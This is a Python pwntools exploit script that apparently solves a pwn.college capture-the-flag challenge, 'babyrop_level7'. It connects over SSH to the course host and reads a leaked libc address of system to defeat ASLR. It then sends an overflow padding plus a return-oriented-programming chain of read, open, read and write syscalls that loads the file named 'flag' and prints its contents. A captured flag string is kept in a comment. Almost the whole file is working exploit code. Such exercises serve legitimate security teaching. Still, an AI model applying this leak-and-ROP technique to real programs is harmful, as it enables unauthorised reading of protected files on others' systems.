#!/usr/bin/env python3
#pwn_college{Ao9MRny5LwUrZrnFzyO2AP3YS23.dZjNywCN2gzW}
#python3 solution.py

from pwn import *

local = False
#local = True

#static addresses in libc:
target_address_1 = 0x4a550 #pop rax; ret;
target_address_2 = 0x26b72 #pop rdi; ret;
target_address_3 = 0x27529 #pop rsi; ret;
target_address_4 = 0x11c371 #pop rdx ; pop r12 ; ret
target_address_5 = 0x66229 #syscall; ret;
static_system_addr = 0x55410

if local:
    p = process("./babyrop_level7_testing1")
    raw_input("attach gdb")
else:
    s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
    p = s.process("./babyrop_level7_testing1")


p.recvuntil("[LEAK] The address of \"system\" in libc is: ")
leaks = p.recvuntil("\n") # return bytes
leaks = leaks.decode().split('.')   # convert byte to string
print("leaked libc address of system function: ", leaks[0]) # to defeat ASLR

system_libc_addr = int(leaks[0], 16)
libc_base_addr = system_libc_addr - static_system_addr
print("libc based address after loading", hex(libc_base_addr))

#dynamic addresses in libc:
target_address_1 += libc_base_addr
target_address_2 += libc_base_addr
target_address_3 += libc_base_addr
target_address_4 += libc_base_addr
target_address_5 += libc_base_addr


#pad = cyclic(128, n=8)
pad = b'A' * cyclic_find("laaaaaaa", n=8)


data_section="0x405500" # known memory address where flag's filename and later flag content gets copied
r12 = 0x00 # bogus, just to satisfy target_address_4

rax = 0x00 # read syscall
rdi = 0x00 # read from stdin
rsi = int(data_section, 16) # known memory address where flag's filename and later flag content gets copied
rdx = 0x08 # 8B flag
payload = pad + p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(r12) + p64(target_address_5) # read syscall

rax = 0x02 # open sys_call
rdi = int(data_section, 16) # path where "flag" keyword is stored
rsi = 0x00
rdx = 0x00
payload += p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(r12) + p64(target_address_5) # open syscall
#rax will contain the return value i.e. file handle here
#since we already know that the fd for flag file will be 3, hence we are not copying rax to rdi and directly putting value 3 in rdi instead.

rax = 0x00 # read syscall
rdi = 0x03 # fd from open syscall
rsi = int(data_section, 16) # memory where content gets copied
rdx = 0x40 # 64B flag
payload += p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(r12) + p64(target_address_5) # read syscall

rax = 0x01 # write syscall
rdi = 0x02 # fd for stdout
rsi = int(data_section, 16) # memory to read from
rdx = 0x40 # 64B flag
payload += p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(r12) + p64(target_address_5) # write syscall


print(payload)
p.sendline(payload)

flag_path = b'flag\x00\x00\x00\x00'
p.sendline(flag_path) # input 'flag' as a filename to store in known location in data_section

p.interactive()



